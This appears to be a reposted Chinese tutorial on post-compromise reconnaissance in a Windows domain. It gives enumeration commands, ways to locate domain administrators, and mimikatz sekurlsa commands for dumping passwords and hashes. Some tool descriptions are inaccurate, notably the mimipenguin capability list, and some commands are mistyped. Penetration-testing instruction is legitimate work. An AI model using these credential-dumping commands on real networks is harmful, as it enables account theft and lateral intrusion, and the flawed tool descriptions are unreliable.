<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/HCKDndXrD8sdn4_f1r4l0g)

**点击关注公众号，知识干货及时送达**👇

![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif)

  

**一、基本信息收集**

目的：了解当前拿到的计算机的基本信息，为后续判断服务器角色，网络环境做准备。

<table cellspacing="0" cellpadding="0"><tbody><tr><td width="141" valign="top"><p>systeminfo<o:p></o:p></p></td><td width="394" valign="top"><p>主机详细信息（操作系统版本、多少位的操作系统、补丁编号）<o:p></o:p></p></td></tr><tr><td width="141" valign="top"><p>net start<o:p></o:p></p></td><td width="394" valign="top"><p>启动服务（看他开了什么服务，判断他是什么角色）<o:p></o:p></p></td></tr><tr><td width="141" valign="top"><p>tasklist<o:p></o:p></p></td><td width="394" valign="top"><p>进程列表（看他开了哪些进程，进一步判断）<o:p></o:p></p></td></tr><tr><td width="141" valign="top"><p>schtasks<o:p></o:p></p></td><td width="394" valign="top"><p>计划任务<o:p></o:p></p></td></tr></tbody></table>

![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif)

  

**二、网络信息收集 /** **判断存不存在域**

<table cellspacing="0" cellpadding="0"><tbody><tr><td width="238" height="11"><p>ipconfig&nbsp;/all<o:p></o:p></p></td><td width="301" height="11"><p>看他的主 dns 后缀，判断他有没有域<o:p></o:p></p></td></tr><tr><td height="11" width="233"><p>net view/domain &nbsp;&nbsp;<o:p></o:p></p></td><td height="11" width="299"><p>看看有没有反应，如果有那么就存在域<o:p></o:p></p></td></tr><tr><td height="11" width="233"><p>net time/domain<o:p></o:p></p></td><td height="11" width="297"><p>看看他时间会不会返回域名<o:p></o:p></p></td></tr><tr><td height="11" width="233"><p>nslookup + &nbsp;net time/domain&nbsp;<o:p></o:p></p></td><td height="11" width="297"><p>返回的域名，看看域控的 ip 地址<o:p></o:p></p></td></tr><tr><td height="11" width="233"><p>netstat&nbsp;-ano<o:p></o:p></p></td><td height="11" width="297"><p>看看本机网络端口的开放情况<o:p></o:p></p></td></tr><tr><td height="12" width="233"><p>Whoami/all<o:p></o:p></p></td><td height="12" width="297"><p>获取域 id——sid, 域 id 是唯一 id<o:p></o:p></p></td></tr></tbody></table>

  
![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif)

  

**三、用户信息收集**

**1，用户角色信息：**

<table cellspacing="0" cellpadding="0"><tbody><tr><td width="236" height="11"><p>Domain Admins<o:p></o:p></p></td><td width="300" height="11"><p>域管理员（默认对域控制器有完全控制权）<o:p></o:p></p></td></tr><tr><td height="11" width="236"><p>Domain &nbsp;Computers<o:p></o:p></p></td><td height="11" width="300"><p>域内机器<o:p></o:p></p></td></tr><tr><td height="11" width="236"><p>Domain &nbsp;Controllers<o:p></o:p></p></td><td height="11" width="299"><p>域控制器<o:p></o:p></p></td></tr><tr><td height="11" width="236"><p>Domain Guest<o:p></o:p></p></td><td height="11" width="299"><p>域访客，权限低<o:p></o:p></p></td></tr><tr><td height="11" width="236"><p>Domain Users<o:p></o:p></p></td><td height="11" width="299"><p>域用户<o:p></o:p></p></td></tr><tr><td height="12" width="236"><p>Enterprise &nbsp;Admins<o:p></o:p></p></td><td height="12" width="299"><p>企业系统管理员用户（默认对域控制器有完全控制权）<o:p></o:p></p></td></tr></tbody></table>

**2，****相关用户收集操作命令：** 

<table><tbody><tr><td width="268" valign="top">whoami &nbsp;&nbsp;/all</td><td width="268" valign="top">用户权限</td></tr><tr><td width="268" valign="top">net&nbsp;config&nbsp;workstation</td><td width="268" valign="top">登录信息</td></tr><tr><td width="268" valign="top">net&nbsp;user</td><td width="268" valign="top">查看本地用户</td></tr><tr><td width="268" valign="top">net localgroup</td><td width="268" valign="top">本地用户组</td></tr><tr><td width="268" valign="top">net&nbsp;user&nbsp;/domain</td><td width="268" valign="top">查看当前域内的用户</td></tr><tr><td width="268" valign="top">net&nbsp;group/domain</td><td width="268" valign="top">获取域用户组信息</td></tr><tr><td width="268" valign="top">wmic&nbsp;useraccount&nbsp;get&nbsp;/all</td><td width="268" valign="top">涉及域用户详细信息</td></tr><tr><td width="268" valign="top">net group&nbsp;&nbsp;&nbsp;"Domain Admins" /domain</td><td width="268" valign="top">查询域管理员账户</td></tr><tr><td width="268" valign="top">net group &nbsp;&nbsp;"Enterprise Admins" /domain</td><td width="268" valign="top">查询管理员用户组</td></tr><tr><td width="268" valign="top">net group &nbsp;&nbsp;"Domain Controllers" /domain</td><td width="268" valign="top">查询域控制器</td></tr><tr><td valign="top" colspan="1" rowspan="1">net&nbsp;user&nbsp;bypass&nbsp;/domain&nbsp;</td><td valign="top" colspan="1" rowspan="1">获取指定域用户 bypass 的详细信息</td></tr></tbody></table>

![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif)

  

**四、定位域管理员**

**1****，****Psloggedon.exe**

Psloggedon 可以查看本地登录的用户、域登录的用户以及远程计算机登录的用户，下载 psloggedon 后在当前目录打开命令行即可使用，说明参数如下：

<table><tbody><tr><td width="200.33333333333334" valign="top">-<br></td><td width="335.3333333333333" valign="top"><p>显示支持的选项和用于输出值的测量单位<o:p></o:p></p></td></tr><tr><td width="200.33333333333334" valign="top">-l</td><td width="335.3333333333333" valign="top">只显示本地登录，而不显示本地和网络资源登录</td></tr><tr><td width="200.33333333333334" valign="top">-x</td><td width="335.3333333333333" valign="top">不显示登录时间</td></tr><tr><td width="200.33333333333334" valign="top">computername</td><td width="335.3333333333333" valign="top">指定要列出登录信息的计算机的名称</td></tr><tr><td valign="top" colspan="1" rowspan="1" width="200.33333333333334">username</td><td valign="top" colspan="1" rowspan="1" width="335.3333333333333"><p>如果指定用户名，PsLoggedOn 将在网络中搜索该用户登录的计算机<o:p></o:p></p></td></tr></tbody></table>

**2****，****PVEDFindADUser**

可查找活动目录用户的位置、枚举域用户、查找特定计算机上登录的用户 (本地用户、通过 RDP 登录的用户、用于运行服务的用户、计划任务的用户)，直接运行以下命令即可显示域中所有计算机上登录的所有用户，结果输出到 report.csv 文件中。

```
PVEFindADUser.exe -current

```

![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif)

  

**五、凭据信息收集工具利用**

旨在收集各种密文，明文，口令等，为后续横向渗透做好测试准备。

**1****，****mimikatz**

首先提升权限 

```
privilege::debug

```

然后抓取明文密码，直接运行：

```
mimikatz.exe "privilege::debug"

```

再利用 sekurlsa 模块，获取密码信息

```
sekurlsa::logonpasswords

```

其他命令:

<table><tbody><tr><td width="268" valign="top">sekurlsa::msv</td><td width="268" valign="top">提取 ntlm hash 凭证</td></tr><tr><td width="268" valign="top">sekurlsa::wdigest</td><td width="268" valign="top">提取用户密码明文</td></tr><tr><td width="268" valign="top">sekurlsa::kerberos</td><td width="268" valign="top">提取域账户凭证</td></tr></tbody></table>

**2****，****mimipenguin**

直接./mimipenguin.sh 执行脚本即可，可以获取以下内容 

```
1.站点源码备份文件、数据库备份文件等 
2.各类数据库 Web 管理入口，如PHPMyAdmin
3.浏览器保存密码、浏览器 Cookies
4.其他用户会话、3389 和 ipc$连接记录、回收站内容 
5.Windows 保存的 WIFI 密码 
6.网络内部的各种帐号和密码，如：Email、VPN、FTP、OA 等

```

![](https://mmbiz.qpic.cn/mmbiz_gif/pLGTianTzSu7XRhTMZOBAqXehvREhD5ThABGJdRialUx3dQWwO7fclsicyiajicKfvXV4kHs38nkwFxUSckVF2nYlibA/640?wx_fmt=gif)

  

**六、查找域管理进程**

**1、 本机检查**

```
netgroup Domain Admins/domain             获取域管理员列表
tasklist /v                               列出本机的所有进程及进程用户

```

**2、查询域控的域用户会话**

```
netgroup Domain Controllers/domain        查询域控制器列表
net group Domain admins/domain            收集域管理员列 

```

- End -

点击下方名片，关注我们

觉得内容不错，就点下 “**赞**” 和 “**在看**”

如果不想错过新的内容推送，可以设为**星标**![](https://mmbiz.qpic.cn/mmbiz_png/Yv6ic9zgr5hTYyCkc91euAiaGULJSbiaHricFHs2dd2sib20WTJKwHYD90Jia9HCKxnmJUwnkicGU7rVP3EYCVh3dMnng/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic)哦